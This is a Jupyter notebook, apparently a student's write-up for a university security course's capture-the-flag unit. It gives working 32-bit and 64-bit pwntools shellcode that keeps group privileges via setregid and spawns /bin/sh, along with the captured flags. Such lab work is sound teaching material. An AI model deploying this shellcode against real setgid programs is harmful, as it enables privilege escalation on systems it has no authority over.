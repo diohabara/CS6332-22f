{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Write-up for Unit2-1\n",
    "\n",
    "- netID: TXK220008\n",
    "- Name: Takemaru Kadoi"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "All the write-ups are supposed to use this import."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "ename": "",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31mFailed to start the Kernel. \n",
      "\u001b[1;31mUnhandled error. \n",
      "\u001b[1;31mView Jupyter <a href='command:jupyter.viewOutput'>log</a> for further details."
     ]
    }
   ],
   "source": [
    "from pwn import asm, process, context"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 1-shellcode-32\n",
    "\n",
    "The problem statement is below.\n",
    "\n",
    "```md\n",
    "Write a 32-bit shellcode that runs:\n",
    "    setregid(getegid(), getegid())\n",
    "    execve(\"/bin/sh\", 0, 0);\n",
    "and put the shellcode binary (shellcode.bin) into this directory.\n",
    "```\n",
    "\n",
    "The solution seems straightforward. Write assembly to execute the command above.\n",
    "\n",
    "[This site](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit) looks good to refer to system calls."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This is the assembly code to execute the required shellcode."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "ename": "",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31mFailed to start the Kernel. \n",
      "\u001b[1;31mUnhandled error. \n",
      "\u001b[1;31mView Jupyter <a href='command:jupyter.viewOutput'>log</a> for further details."
     ]
    }
   ],
   "source": [
    "# setregid(getegid(), getegid())\n",
    "# getegid: 0x32(%eax)\n",
    "# setregid: 0x47(%eax) (%ebx = gid_t rgid, %ecx = gid_t rgid)\n",
    "shellcode = asm(\n",
    "    \"\"\"\n",
    "mov     eax, 0x32\n",
    "int     0x80\n",
    "mov     ebx, eax\n",
    "mov     ecx, eax\n",
    "mov     eax, 0x47\n",
    "int     0x80\n",
    "\"\"\"\n",
    ")\n",
    "# execve(\"/bin/sh\", 0, 0)\n",
    "# execve: 0x0b(%eax) (%ebx = const char *filename, %ecx = const char *const *argv, %edx = const char *const *envp)\n",
    "# /bin/sh = 2f62696e2f7368\n",
    "shellcode += asm(\n",
    "    \"\"\"\n",
    "mov     eax, 0x0b\n",
    "push    edx\n",
    "push    0x68732f6e\n",
    "push    0x69622f2f\n",
    "mov     ebx, esp\n",
    "mov     ecx, 0\n",
    "mov     edx, 0\n",
    "int     0x80\n",
    "\"\"\"\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This is the code to run the assembly."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "ename": "",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31mFailed to start the Kernel. \n",
      "\u001b[1;31mUnhandled error. \n",
      "\u001b[1;31mView Jupyter <a href='command:jupyter.viewOutput'>log</a> for further details."
     ]
    }
   ],
   "source": [
    "io = process(['./1-shellcode-32'])\n",
    "io.interactive()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "After running the program, you get the following flag.\n",
    "\n",
    "```bash\n",
    "TXK220008@ctf-vm1:~/unit2/1-shellcode-32$ ./solve.py\n",
    "[+] Starting local process './1-shellcode-32': pid 17060\n",
    "[*] Switching to interactive mode\n",
    "Reading shellcode from shellcode.bin\n",
    "$ cat flag\n",
    "CS6332{execve_bin_sh}\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 2-shellcode-64\n",
    "\n",
    "The problem statement is below.\n",
    "\n",
    "```md\n",
    "Write a 64-bit shellcode that runs:\n",
    "    setregid(getegid(), getegid())\n",
    "    execve(\"/bin/sh\", 0, 0);\n",
    "and put the shellcode binary (shellcode.bin) into this directory.\n",
    "```\n",
    "\n",
    "The only difference from `1-shellcode-32` is that this problem uses 64-bit program. Bear it in mind and solve it."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "To make the assembly for 64-bit program, use `context.clear(arch=\"amd64\")`."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The program is basically the same, but to use 8 bytes for a string, I am using stack here.\n",
    "\n",
    "```x86asm\n",
    "mov     rbx, 0x68732f6e69622f2f\n",
    "push    0\n",
    "push    rbx\n",
    "mov     rdi, rsp\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "ename": "",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31mFailed to start the Kernel. \n",
      "\u001b[1;31mUnhandled error. \n",
      "\u001b[1;31mView Jupyter <a href='command:jupyter.viewOutput'>log</a> for further details."
     ]
    }
   ],
   "source": [
    "context.clear(arch=\"amd64\")\n",
    "\n",
    "# setregid(getegid(), getegid())\n",
    "# getegid: 0x6c(%rax)\n",
    "# setregid: 0x72(%rax) (%rdi = gid_t rgid, %rsi = gid_t rgid)\n",
    "shellcode = asm(\n",
    "    \"\"\"\n",
    "mov     rax, 0x6c\n",
    "syscall\n",
    "mov     rdi, rax\n",
    "mov     rsi, rax\n",
    "mov     rax, 0x72\n",
    "syscall\n",
    "\"\"\"\n",
    ")\n",
    "# execve(\"/bin/sh\", 0, 0)\n",
    "# execve: 0x3b(%rax) (%rdi = const char *filename, %rsi = const char *const *argv, %rdx = const char *const *envp)\n",
    "# /bin/sh = 2f62696e2f7368\n",
    "shellcode += asm(\n",
    "    \"\"\"\n",
    "mov     rax, 0x3b\n",
    "mov     rbx, 0x68732f6e69622f2f\n",
    "push    0\n",
    "push    rbx\n",
    "mov     rdi, rsp\n",
    "mov     rsi, 0\n",
    "mov     rdx, 0\n",
    "syscall\n",
    "\"\"\"\n",
    ")\n",
    "with open(\"shellcode.bin\", \"wb\") as shellcode_file:\n",
    "    shellcode_file.write(shellcode)\n",
    "io = process([\"./2-shellcode-64\"])\n",
    "io.interactive()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "After running the program, you get the following flag.\n",
    "\n",
    "```bash\n",
    "TXK220008@ctf-vm1:~/unit2/2-shellcode-64$ ./solve2.py\n",
    "[+] Starting local process './2-shellcode-64': pid 9898\n",
    "[*] Switching to interactive mode\n",
    "Reading shellcode from shellcode.bin\n",
    "$ cat flag\n",
    "CS6332{exEcvE_b1n_5h\n",
    "```"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.8.7 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.7"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "31f2aee4e71d21fbe5cf8b01ff0e069b9275f58929596ceb00d14d90e3e16cd6"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
